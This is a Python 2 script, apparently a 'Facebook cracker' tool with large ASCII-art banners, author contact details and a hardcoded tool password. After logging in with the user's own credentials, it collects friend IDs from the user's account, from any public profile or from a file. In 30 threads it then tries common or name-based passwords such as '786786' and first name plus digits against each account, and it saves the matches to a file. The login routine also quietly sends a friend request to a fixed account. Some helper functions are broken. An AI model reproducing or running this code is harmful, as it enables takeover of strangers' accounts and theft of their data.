#!/usr/bin/python2
#coding=utf-8


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]


def keluar():
	print "\033[1;96m[!] \x1b[1;91mExit"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(00000.1)


##### LOGO #####
logo = """🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴
🔴🔴🔴🔴🔴🔴🔴🤔🤔🔴🔴🔴🔴🔴
🔴🔴🔴🔴🔴🔴🔴🔴🤔🤔🔴🔴🔴🔴
🔴🔴🔴🔴🔴🤔🤔🔴🔴🤔🤔🔴🔴🔴
🔴🔴🔴🔴🤔🤔🤔🔴🔴🔴🤔🤔🔴🔴
🔴🔴🔴🤔🤔🤔🤔🔴🔴🔴🤔🤔🔴🔴
🔴🔴🔴🤔🤔🤔🤔🤔🔴🔴🤔🤔🔴🔴
🔴🔴🔴🔴🔴🔴🤔🤔🤔🔴🤔🤔🔴🔴
🔴🔴🔴🔴🤔🔴🔴🤔🤔🤔🤔🤔🔴🔴
🔴🔴🔴🤔🤔🤔🔴🔴🤔🤔🤔🤔🔴🔴
🔴🔴🤔🤔🔴🤔🤔🤔🤔🤔🤔🤔🔴🔴
🔴🤔🤔🔴🔴🔴🤔🤔🤔🔴🤔🤔🤔🔴
🔴🤔🔴🔴🔴🔴🔴🔴🔴🔴🔴🤔🤔🔴
🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴﻿ 
	        
  




 
██╗███╗░░░███╗██████╗░░█████╗░███╗░░██╗
██║████╗░████║██╔══██╗██╔══██╗████╗░██║
██║██╔████╔██║██████╔╝███████║██╔██╗██║
██║██║╚██╔╝██║██╔══██╗██╔══██║██║╚████║
██║██║░╚═╝░██║██║░░██║██║░░██║██║░╚███║
╚═╝╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝                                                
               Facebook Link":https:Khondokar.Imran273
                        
▀█▀ ▒█▀▄▀█ ▒█▀▀█ ░█▀▀█ ▒█▄░▒█ 
▒█░ ▒█▒█▒█ ▒█▄▄▀ ▒█▄▄█ ▒█▒█▒█ 
▄█▄ ▒█░░▒█ ▒█░▒█ ▒█░▒█ ▒█░░▀█
                    
░░█▀░░░░░░░░░░░▀▀███████░░░░ 
░░█▌░░░░░░░░░░░░░░░▀██████░░░ 
░█▌░░░░░░░░░░░░░░░░███████▌░░ 
░█░░░░░░░░░░░░░░░░░████████░░ 
▐▌░░░░░░░░░░░░░░░░░▀██████▌░░ 
░▌▄███▌░░░░▀████▄░░░░▀████▌░░ 
▐▀▀▄█▄░▌░░░▄██▄▄▄▀░░░░████▄▄░ 
▐░▀░░═▐░░░░░░══░░▀░░░░▐▀░▄▀▌▌ 
▐░░░░░▌░░░░░░░░░░░░░░░▀░▀░░▌▌ 
▐░░░▄▀░░░▀░▌░░░░░░░░░░░░▌█░▌▌ 
░▌░░▀▀▄▄▀▀▄▌▌░░░░░░░░░░▐░▀▐▐░ 
░▌░░▌░▄▄▄▄░░░▌░░░░░░░░▐░░▀▐░░ 
░█░▐▄██████▄░▐░░░░░░░░█▀▄▄▀░░ 
░▐░▌▌░░░░░░▀▀▄▐░░░░░░█▌░░░░░░ 
░░█░░▄▀▀▀▀▄░▄═╝▄░░░▄▀░▌░░░░░░ 
░░░▌▐░░░░░░▌░▀▀░░▄▀░░▐░░░░░░░ 
░░░▀▄░░░░░░░░░▄▀▀░░░░█░░░░░░░ 
░░░▄█▄▄▄▄▄▄▄▀▀░░░░░░░▌▌░░░░░░ 
░░▄▀▌▀▌░░░░░░░░░░░░░▄▀▀▄░░░░░ 
▄▀░░▌░▀▄░░░░░░░░░░▄▀░░▌░▀▄░░░ 
░░░░▌█▄▄▀▄░░░░░░▄▀░░░░▌░░░▌▄▄ 
░░░▄▐██████▄▄░▄▀░░▄▄▄▄▌░░░░▄░ 
░░▄▌████████▄▄▄███████▌░░░░░▄ 
░▄▀░██████████████████▌▀▄░░░░ 
▀░░░█████▀▀░░░▀███████░░░▀▄░░ 
░░░░▐█▀░░░▐░░░░░▀████▌░░░░▀▄░ 
░░░░░░▌░░░▐░░░░▐░░▀▀█░░░░░░░▀ 
░░░░░░▐░░░░▌░░░▐░░░░░▌░░░░░░░ 
░╔╗║░╔═╗░═╦═░░░░░╔╗░░╔═╗░╦═╗░ 
░║║║░║░║░░║░░░░░░╠╩╗░╠═╣░║░║░ 
░║╚╝░╚═╝░░║░░░░░░╚═╝░║░║░╩═╝░ 
 
────(♥)(♥)(♥)────(♥)(♥)(♥) __ ɪƒ ƴσυ'ʀє αʟσηє,
──(♥)██████(♥)(♥)██████(♥) ɪ'ʟʟ ɓє ƴσυʀ ѕɧα∂σѡ.
─(♥)████████(♥)████████(♥) ɪƒ ƴσυ ѡαηт тσ cʀƴ,
─(♥)██████████████████(♥) ɪ'ʟʟ ɓє ƴσυʀ ѕɧσυʟ∂єʀ.
──(♥)████████████████(♥) ɪƒ ƴσυ ѡαηт α ɧυɢ,
────(♥)████████████(♥) __ ɪ'ʟʟ ɓє ƴσυʀ ρɪʟʟσѡ.
──────(♥)████████(♥) ɪƒ ƴσυ ηєє∂ тσ ɓє ɧαρρƴ,
────────(♥)████(♥) __ ɪ'ʟʟ ɓє ƴσυʀ ѕɱɪʟє.
─────────(♥)██(♥) ɓυт αηƴтɪɱє ƴσυ ηєє∂ α ƒʀɪєη∂,
───────────(♥) __ ɪ'ʟʟ ʝυѕт ɓє ɱє.

        𝕂𝕙𝕠𝕟𝕕𝕠𝕜𝕒𝕣-𝕀𝕞𝕣𝕒𝕟

\033[1;91m=======================================
\033[1;96mAuthor  \033[1;93m: \033[1;92mKHONDOKAR-IMRAN
?\033[1;96mInstagram \033[1;93m: \033[1;92mKhondokar_Imran
\033[1;96mFacebook  \033[1;93m: \033[1: Khondokar.Imran273
\033[1;96mGithub \033[1;93m: \033[1;92mhttps://github.com/KhondokarImran/Khondokar3
\033[1;91m======================================="""

def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;96m[●] \x1b[1;93mSedang masuk \x1b[1;97m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print "\033[1;96m ============================================================="
print  """\033[1;91m

                        KHONDOKAR
                     _______ad88888888888888888888888a, 
________a88888"8888888888888888888888, 
______,8888"__"P88888888888888888888b, 
______d88_________`""P88888888888888888, 
_____,8888b_______________""88888888888888, 
_____d8P'''__,aa,______________""888888888b 
_____888bbdd888888ba,__,I_________"88888888, 
_____8888888888888888ba8"_________,88888888b 
____,888888888888888888b,________,8888888888 
____(88888888888888888888,______,88888888888, 
____d888888888888888888888,____,8___"8888888b 
____88888888888888888888888__.;8'"""__(888888 
____8888888888888I"8888888P_,8"_,aaa,__888888 
____888888888888I:8888888"_,8"__`b8d'__(88888 
____(8888888888I'888888P'_,8)__________88888 
_____88888888I"__8888P'__,8")__________88888 
_____8888888I'___888"___,8"_(._.)_______88888 
_____(8888I"_____"88,__,8"_____________,8888P 
______888I'_______"P8_,8"_____________,88888) 
_____(88I'__________",8"__M""""""M___,888888' 
____,8I"____________,8(____"aaaa"___,8888888 
___,8I'____________,888a___________,8888888) 
__,8I'____________,888888,_______,888888888 
_,8I'____________,8888888'`-===-'888888888' 
,8I'____________,8888888"________88888888" 
8I'____________,8"____88_________"888888P 
8I____________,8'_____88__________`P888" 
8I___________,8I______88____________"8ba,. 
(8,_________,8P'______88______________88""8bma,. 
_8I________,8P'_______88,______________"8b___""P8ma, 
_(8,______,8d"________`88,_______________"8b_____`"8a 
__8I_____,8dP_________,8X8,________________"8b.____:8b 
__(8____,8dP'__,I____,8XXX8,________________`88,____8) 
___8,___8dP'__,I____,8XxxxX8,_____I,_________8X8,__,8 
___8I___8P'__,I____,8XxxxxxX8,_____I,________`8X88,I8 
___I8,__"___,I____,8XxxxxxxxX8b,____I,________8XXX88I, 
___`8I______I'__,8XxxxxxxxxxxxXX8____I________8XXxxXX8, 
____8I_____(8__,8XxxxxxxxxxxxxxxX8___I________8XxxxxxXX8, 
___,8I_____I[_,8XxxxxxxxxxxxxxxxxX8__8________8XxxxxxxxX8, 
___d8I,____I[_8XxxxxxxxxxxxxxxxxxX8b_8_______(8XxxxxxxxxX8, 
___888I____`8,8XxxxxxxxxxxxxxxxxxxX8_8,_____,8XxxxxxxxxxxX8 
___8888,____"88XxxxxxxxxxxxxxxxxxxX8)8I____.8XxxxxxxxxxxxX8 
__,8888I_____88XxxxxxxxxxxxxxxxxxxX8_`8,__,8XxxxxxxxxxxxX8" 
__d88888_____`8XXxxxxxxxxxxxxxxxxX8'__`8,,8XxxxxxxxxxxxX8" 
__888888I_____`8XXxxxxxxxxxxxxxxX8'____"88XxxxxxxxxxxxX8" 
__88888888bbaaaa88XXxxxxxxxxxxXX8)______)8XXxxxxxxxxXX8" 
__8888888I,_``""""""8888888888888888aaaaa8888XxxxxXX8" 
__(8888888I,______________________.__```"""""88888P" 
___88888888I,___________________,8I___8,_______I8" 
____"""88888I,________________,8I'____"I8,____;8" 
___________`8I,_____________,8I'_______`I8,___8) 
____________`8I,___________,8I'__________I8__:8' 
_____________`8I,_________,8I'___________I8__:8 
______________`8I_______,8I'_____________`8__(8 
_______________8I_____,8I'________________8__(8; 
_______________8I____,8"__________________I___88, 
______________.8I___,8'_______________________8"8, 
______________(PI___'8_______________________,8,`8, 
_____________.88'____________,@@___________.a8X8,`8, 
_____________(88_____________@@@_________,a8XX888,`8, 
____________(888_____________@@'_______,d8XX8"__"b_`8, 
___________.8888,_____________________a8XXX8"____"a_`8, 
__________.888X88___________________,d8XX8I"______9,_`8, 
_________.88:8XX8,_________________a8XxX8I'_______`8__`8, 
________.88'_8XxX8a_____________,ad8XxX8I'________,8___`8, 
________d8'__8XxxxX8ba,______,ad8XxxX8I"__________8__,__`8, 
_______(8I___8XxxxxxX888888888XxxxX8I"____________8__II__`8 
_______8I'___"8XxxxxxxxxxxxxxxxxxX8I'____________(8__8)___8; 
______(8I_____8XxxxxxxxxxxxxxxxxX8"______________(8__8)___8I 
______8P'_____(8XxxxxxxxxxxxxxX8I'________________8,_(8___:8 
_____(8'_______8XxxxxxxxxxxxxxX8'_________________`8,_8____8 
_____8I________`8XxxxxxxxxxxxX8'___________________`8,8___;8 
_____8'_________`8XxxxxxxxxxX8'_____________________`8I__,8' 
_____8___________`8XxxxxxxxX8'_______________________8'_,8' 
_____8____________`8XxxxxxX8'________________________8_,8' 
_____8_____________`8XxxxX8'________________________d'_8' 
_____8______________`8XxxX8_________________________8_8' 
_____8________________"8X8'_________________________"8" 
_____8,________________`88___________________________8 
_____8I________________,8'__________________________d) 
_____`8,_______________d8__________________________,8 
______(b_______________8'_________________________,8' 
_______8,_____________dP_________________________,8' 
_______(b_____________8'________________________,8' 
________8,___________d8________________________,8' 
________(b___________8'_______________________,8' 
_________8,_________a8_______________________,8' 
_________(b_________8'______________________,8' 
__________8,_______,8______________________,8' 
__________(b_______8'_____________________,8' 
___________8,_____,8_____________________,8' 
___________(b_____8'____________________,8' 
____________8,___d8____________________,8' 
____________(b__,8'___________________,8' 
_____________8,,I8___________________,8' 
_____________I8I8'__________________,8' 
_____________`I8I__________________,8' 
______________I8'_________________,8' 
______________"8_________________,8' 
______________(8________________,8' 
______________8I_______________,8' 
______________(b,___8,________,8) 
______________`8I___"88______,8i8, 
_______________(b,__________,8"8") 
_______________`8I__,8______8)_8_8 
________________8I__8I______"__8_8 
________________(b__8I_________8_8 
________________`8__(8,________b_8, 
_________________8___8)________"b"8, 
_________________8___8(_________"b"8 
_________________8___"I__________"b8, 
_________________8________________`8) 
_________________8_________________I8 
_________________8_________________(8 
_________________8,_________________8, 
_________________Ib_________________8) 
_________________(8_________________I8 
__________________8_________________I8 
__________________8_________________I8 
__________________8,________________I8 
__________________Ib________________8I 
__________________(8_______________(8' 
___________________8_______________I8 
___________________8,______________8I 
___________________Ib_____________(8' 
___________________(8_____________I8 
___________________`8_____________8I 
____________________8____________(8' 
____________________8,___________I8 
____________________Ib___________8I 
____________________(8___________8' 
_____________________8,_________(8 
_____________________Ib_________I8 
_____________________(8_________8I 
______________________8,________8' 
______________________(b_______(8 
_______________________8,______I8 
_______________________I8______I8 
_______________________(8______I8 
________________________8______I8, 
________________________8______8_8, 
________________________8,_____8_8' 
_______________________,I8_____"8" 
______________________,8"8,_____8, 
_____________________,8'_`8_____`b 
____________________,8'___8______8, 
___________________,8'____(a_____`b 
__________________,8'_____`8______8, 
__________________I8/______8______`b, 
__________________I8-/_____8_______`8, 
__________________(8/-/____8________`8, 
___________________8I/-/__,8_________`8 
___________________`8I/--,I8________-8) 
____________________`8I,,d8I_______-8) 
______________________"bdI"8,_____-I8 
___________________________`8,___-I8' 
____________________________`8,,--I8 
_____________________________`Ib,,I8 
______________________________`I8I
                   WhatsApp : 03124788959
\033[1;96mAuthor  \033[1;93m: \033[1;92mKHONDOKAR-IMRAN
\033[1;96mInstagram \033[1;93m: \033[1;92mKhondokar_Imran
\033[1;96mFacebook  \033[1;93m: \033[1;92m Khondokar.Imran273
\033[1;96mGithub \033[1;93m: \033[1;92mhttps://github.com/KhondokarImran/Khondokar3
\033[1;91m======================================="""
print " \x1b[1;93m============================================================="

CorrectUsername = "imran"
CorrectPassword = "imran"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;96m[☆] \x1b[1;93mUsername Of Tool \x1b[1;96m>>>> ")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;96m[☆] \x1b[1;93mPassword Of Tool \x1b[1;96m>>>> ")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username
            loop = 'false'
        else:
            print "Wrong Password"
            os.system('xdg-open https://www.youtube.com/channel/UCDJbhYSPToi1-CdzGLEzAIQ?sub_confirmation=1 ')
    else:
        print "Wrong Username"
        os.system('xdg-open  https://www.youtube.com/channel/UCDJbhYSPToi1-CdzGLEzAIQ?sub_confirmation=1 ')

def login():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		print logo
		print 42*"\033[1;96m="
		print('\033[1;96m[☆] \x1b[1;93mLOGIN WITH FACEBOOK \x1b[1;96m[☆]' )
		id = raw_input('\033[1;96m[+] \x1b[1;93mID/Email \x1b[1;91m: \x1b[1;92m')
		pwd = raw_input('\033[1;96m[+] \x1b[1;93mPassword \x1b[1;91m: \x1b[1;92m')
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\033[1;96m[!] \x1b[1;91mThere is no internet connection"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
				print '\n\033[1;96m[✓] \x1b[1;92mLogin Successful'
				os.system('xdg-open https://www.youtube.com/channel/UCDJbhYSPToi1-CdzGLEzAIQ?sub_confirmation=1')
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\033[1;96m[!] \x1b[1;91mThere is no internet connection"
				keluar()
		if 'checkpoint' in url:
			print("\n\033[1;96m[!] \x1b[1;91mIt seems that your account has a checkpoint")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\033[1;96m[!] \x1b[1;91mPassword/Email is wrong")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()


def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\033[1;96m[!] \x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print"\033[1;96m[!] \033[1;91mIt seems that your account has a checkpoint"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\033[1;96m[!] \x1b[1;91mThere is no internet connection"
		keluar()
	os.system("clear")
	print logo
	print 42*"\033[1;96m="
	print "\033[1;96m[\033[1;97m✓\033[1;96m]\033[1;93m Name \033[1;91m: \033[1;92m"+nama+"\033[1;97m               "
	print "\033[1;96m[\033[1;97m✓\033[1;96m]\033[1;93m ID   \033[1;91m: \033[1;92m"+id+"\x1b[1;97m              "
	print 42*"\033[1;96m="
	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;93m Start Hacking"
	print "\x1b[1;96m[\x1b[1;91m0\x1b[1;96m]\x1b[1;91m Exit            "
	pilih()


def pilih():
	unikers = raw_input("\n\033[1;97m >>> \033[1;97m")
	if unikers =="":
		print "\033[1;96m[!] \x1b[1;91mFill in correctly"
		pilih()
	elif unikers =="1":
		super()
	elif unikers =="0":
		jalan('Token Removed')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\033[1;96m[!] \x1b[1;91mFill in correctly"
		pilih()


def super():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;96m[!] \x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print 42*"\033[1;96m="
	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;93m Crack From Friend List"
	print "\x1b[1;96m[\x1b[1;92m2\x1b[1;96m]\x1b[1;93m Crack From Any Public ID"
	print "\x1b[1;96m[\x1b[1;92m3\x1b[1;96m]\x1b[1;93m Crack From File"
	print "\x1b[1;96m[\x1b[1;91m0\x1b[1;96m]\x1b[1;91m Back"
	pilih_super()

def pilih_super():
	peak = raw_input("\n\033[1;97m >>> \033[1;97m")
	if peak =="":
		print "\033[1;96m[!] \x1b[1;91mFill in correctly"
		pilih_super()
	elif peak =="1":
		os.system('clear')
		print logo
		print 42*"\033[1;96m="
		jalan('\033[1;96m[✺] \033[1;93mGetting ID \033[1;97m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		os.system('clear')
		print logo
		print 42*"\033[1;96m="
		idt = raw_input("\033[1;96m[+] \033[1;93mEnter ID \033[1;91m: \033[1;97m")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;93mName\033[1;91m :\033[1;97m "+op["name"]
		except KeyError:
			print"\033[1;96m[!] \x1b[1;91mID Not Found!"
			raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
			super()
		jalan('\033[1;96m[✺] \033[1;93mGetting IDs \033[1;97m...')
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="3":
		os.system('clear')
		print logo
		print 42*"\033[1;96m="
		try:
			idlist = raw_input('\x1b[1;96m[+] \x1b[1;93mEnter File Path  \x1b[1;91m: \x1b[1;97m')
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except IOError:
			print '\x1b[1;96m[!] \x1b[1;91mFile Not Found'
			raw_input('\n\x1b[1;96m[ \x1b[1;97mBack \x1b[1;96m]')
			super()
	elif peak =="0":
		menu()
	else:
		print "\033[1;96m[!] \x1b[1;91mFill in correctly"
		pilih_super()
	
	print "\033[1;96m[+] \033[1;93mTotal IDs \033[1;91m: \033[1;97m"+str(len(id))
	jalan('\033[1;96m[✺] \033[1;93mStarting \033[1;97m...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;96m[\033[1;97m✸\033[1;96m] \033[1;93mCracking \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
	print
	print('\x1b[1;96m[!] \x1b[1;93mTo Stop Process Press CTRL Then Press z')
	print 42*"\033[1;96m="
	
			
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = ('786786')
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;96m[\x1b[1;92mSuccessful\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass1
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;96m[\x1b[1;93mCheckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass1
					cek = open("out/checkpoint.txt", "a")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = b['first_name']+'12345'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print '\x1b[1;96m[\x1b[1;92mSuccessful\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass2
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\x1b[1;96m[\x1b[1;93mCheckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass2
							cek = open("out/checkpoint.txt", "a")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = b['first_name'] + '123'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print '\x1b[1;96m[\x1b[1;92mSuccessful\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass3
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\x1b[1;96m[\x1b[1;93mCheckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass3
									cek = open("out/checkpoint.txt", "a")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = 'Pakistan'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '\x1b[1;96m[\x1b[1;92mSuccessful\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass4
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\x1b[1;96m[\x1b[1;93mCheckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass4
											cek = open("out/checkpoint.txt", "a")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = b['first_name'] + '12'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\x1b[1;96m[\x1b[1;92mSuccessful\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass5
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\x1b[1;96m[\x1b[1;93mCheckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass5
													cek = open("out/checkpoint.txt", "a")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = b['first_name'] + '1234'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print '\x1b[1;96m[\x1b[1;92mSuccessful\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass6
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[1;96m[\x1b[1;93mCheckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass6
															cek = open("out/checkpoint.txt", "a")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
															b = json.loads(a.text)
															pass7 = b['first_name'] + '1122'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
																print '\x1b[1;96m[\x1b[1;92mSuccessful\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass7
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in q["error_msg"]:
																	print '\x1b[1;96m[\x1b[1;93mCheckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass7
																	cek = open("out/checkpoint.txt", "a")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
																	
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print 42*"\033[1;96m="
	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mProcess Has Been Completed Komail says Thank You♥️ \033[1;97m....'
	print"\033[1;96m[+] \033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print("\033[1;96m[+] \033[1;92mTHANKS FOR USING MY COMMANDS ! WE WILL BE RIGHT BACK \033[1;91m: \033[1;97mout/checkpoint.txt")
	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
	menu()

if __name__ == '__main__':
	login()
